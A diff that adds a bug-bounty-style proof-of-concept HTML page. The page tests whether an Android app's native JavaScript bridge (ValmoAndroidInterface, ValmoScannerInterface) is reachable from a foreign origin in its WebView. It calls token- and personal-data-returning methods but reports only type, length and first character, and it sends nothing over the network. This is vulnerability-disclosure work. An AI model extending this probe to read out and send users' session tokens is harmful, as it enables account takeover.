@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<!--
+  Valmo bridge-reachability proof (V-5 -> V-1 -> V-3)
+  ---------------------------------------------------
+  NON-WEAPONISED BY DESIGN.
+
+  This page proves only that the native JavaScript bridge is reachable from a
+  non-Valmo origin. It deliberately does NOT exfiltrate anything:
+
+    * no network requests of any kind (no fetch/XHR/img beacon)
+    * credential values are never printed in full
+    * for getOx()/getXo() only a TYPE and LENGTH are reported, plus a
+      non-reversible fingerprint (first char + length) so the tester can tell
+      "populated" from "null" without capturing the secret
+
+  If the token is null it is because the test account is not logged in;
+  the vulnerability is still proven by method reachability + a non-null
+  return after login.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Valmo Bridge Reachability Test</title>
+<style>
+  :root { color-scheme: dark; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif; background:#101418;
+         color:#e8edf2; margin:0; padding:18px; line-height:1.45; }
+  h1 { font-size:19px; margin:0 0 4px; }
+  .sub { color:#8b98a5; font-size:12px; margin-bottom:14px; }
+  .verdict { padding:14px; border-radius:8px; font-size:17px; font-weight:700;
+             text-align:center; margin-bottom:16px; }
+  .pass { background:#0d3b1e; border:1px solid #1db954; color:#7bf1a8; }
+  .fail { background:#3b1212; border:1px solid #e5484d; color:#ff9a9d; }
+  .warn { background:#3b2f0d; border:1px solid #d4a017; color:#ffd97d; }
+  table { width:100%; border-collapse:collapse; font-size:13px; margin-bottom:16px; }
+  th, td { text-align:left; padding:7px 8px; border-bottom:1px solid #263039; vertical-align:top; }
+  th { color:#8b98a5; font-weight:600; font-size:11px; text-transform:uppercase;
+       letter-spacing:.04em; }
+  code { background:#1b2229; padding:1px 5px; border-radius:4px; font-size:12px;
+         color:#9ad1ff; word-break:break-all; }
+  .ok { color:#7bf1a8; font-weight:700; }
+  .no { color:#ff9a9d; font-weight:700; }
+  .muted { color:#8b98a5; }
+  h2 { font-size:13px; color:#8b98a5; text-transform:uppercase; letter-spacing:.04em;
+       margin:18px 0 8px; }
+</style>
+</head>
+<body>
+
+<h1>Valmo Bridge Reachability Test</h1>
+<div class="sub" id="origin">origin: <span id="originval">…</span></div>
+
+<div class="verdict warn" id="verdict">Running checks…</div>
+
+<h2>Bridge objects</h2>
+<table>
+  <tr><th>Object</th><th>Present?</th></tr>
+  <tr><td><code>window.ValmoAndroidInterface</code></td>
+      <td id="c-ai">…</td></tr>
+  <tr><td><code>window.ValmoScannerInterface</code></td>
+      <td id="c-si">…</td></tr>
+</table>
+
+<h2>Method calls (values never printed)</h2>
+<table>
+  <tr><th>Method</th><th>Result</th><th>Returned</th></tr>
+  <tbody id="calls"></tbody>
+</table>
+
+<h2>Notes</h2>
+<div class="sub" id="notes">
+  Reporting type and length only. No data leaves this page.
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var findings = { ai: false, si: false, anyCall: false, tokenPopulated: false };
+
+  function set(id, html, cls) {
+    var el = document.getElementById(id);
+    if (el) { el.innerHTML = html; if (cls) el.className = cls; }
+  }
+
+  // Non-reversible fingerprint: lets a tester distinguish null / empty /
+  // populated WITHOUT disclosing the secret. Length + first character only.
+  function fingerprint(v) {
+    if (v === null) return "null";
+    if (v === undefined) return "undefined";
+    if (typeof v === "string") {
+      if (v.length === 0) return "empty string";
+      return "string, length=" + v.length +
+             ", startsWith='" + v.charAt(0) + "…' <span class='muted'>(value withheld)</span>";
+    }
+    if (typeof v === "object") {
+      try {
+        var keys = Object.keys(v);
+        return "object, " + keys.length + " key(s) <span class='muted'>(value withheld)</span>";
+      } catch (e) { return "object"; }
+    }
+    return typeof v;
+  }
+
+  var rows = [];
+
+  function attempt(label, obj, method) {
+    if (!obj) {
+      rows.push([label, "<span class='no'>object missing</span>", "—"]);
+      return;
+    }
+    if (typeof obj[method] !== "function") {
+      rows.push([label, "<span class='no'>not a function</span>", "—"]);
+      return;
+    }
+    try {
+      var r = obj[method]();
+      findings.anyCall = true;
+      if (r !== null && r !== undefined && r !== "") findings.tokenPopulated = true;
+      rows.push([label, "<span class='ok'>callable</span>", fingerprint(r)]);
+    } catch (e) {
+      // Even a throwing call proves the method is exposed and reachable.
+      findings.anyCall = true;
+      rows.push([label, "<span class='ok'>callable (threw)</span>",
+                 "exception: " + String(e && e.name || e) + " <span class='muted'>(still exposed)</span>"]);
+    }
+  }
+
+  function run() {
+    set("originval", document.location.origin);
+
+    var ai = window.ValmoAndroidInterface;
+    var si = window.ValmoScannerInterface;
+
+    findings.ai = !!ai;
+    findings.si = !!si;
+
+    set("c-ai", ai ? "<span class='ok'>PRESENT</span>" : "<span class='no'>absent</span>");
+    set("c-si", si ? "<span class='ok'>PRESENT</span>" : "<span class='no'>absent</span>");
+
+    // Credential-bearing methods: fingerprint only, never the value.
+    attempt("ValmoAndroidInterface.getOx()", ai, "getOx");
+    attempt("ValmoAndroidInterface.getXo()", ai, "getXo");
+    // PII-bearing: also fingerprint only.
+    attempt("ValmoAndroidInterface.getAdditionalInfo()", ai, "getAdditionalInfo");
+    attempt("ValmoAndroidInterface.getInstanceId()", ai, "getInstanceId");
+    // Device fingerprint blob (contains android_id) - length only.
+    attempt("ValmoAndroidInterface.getAnalyticsInfo()", ai, "getAnalyticsInfo");
+    // Benign version call, proves argument-free invocation works.
+    attempt("ValmoAndroidInterface.getAppVersionName()", ai, "getAppVersionName");
+
+    var body = document.getElementById("calls");
+    body.innerHTML = "";
+    rows.forEach(function (r) {
+      var tr = document.createElement("tr");
+      tr.innerHTML = "<td><code>" + r[0] + "</code></td><td>" + r[1] + "</td><td>" + r[2] + "</td>";
+      body.appendChild(tr);
+    });
+
+    // Verdict
+    var v = document.getElementById("verdict");
+    if (findings.ai || findings.si) {
+      var populated = findings.tokenPopulated
+        ? " A credential/PII-bearing method returned a populated value."
+        : " Methods were reachable but returned null/empty (likely not logged in).";
+      v.className = "verdict pass";
+      v.innerHTML = "VULNERABLE — native JS bridge reachable from non-Valmo origin<br>" +
+                    "<span style='font-weight:400;font-size:13px'>" +
+                    "ValmoAndroidInterface=" + (findings.ai ? "yes" : "no") +
+                    ", ValmoScannerInterface=" + (findings.si ? "yes" : "no") +
+                    populated + "</span>";
+    } else {
+      v.className = "verdict fail";
+      v.innerHTML = "NOT PROVEN — no bridge object found on this page";
+    }
+
+    // Mirror a compact summary to console + page text for screenshots/logcat.
+    var summary = "VALMO_POC bridge.ai=" + findings.ai +
+                  " bridge.si=" + findings.si +
+                  " callable=" + findings.anyCall +
+                  " populated=" + findings.tokenPopulated;
+    console.log(summary);
+    var n = document.getElementById("notes");
+    n.innerHTML = "No network requests were made by this page. Values withheld by design." +
+                  "<br><br><code>" + summary + "</code>";
+  }
+
+  // Give the WebView a moment to finish wiring the bridge before probing.
+  if (document.readyState === "complete") setTimeout(run, 300);
+  else window.addEventListener("load", function () { setTimeout(run, 300); });
+})();
+</script>
+</body>
+</html>
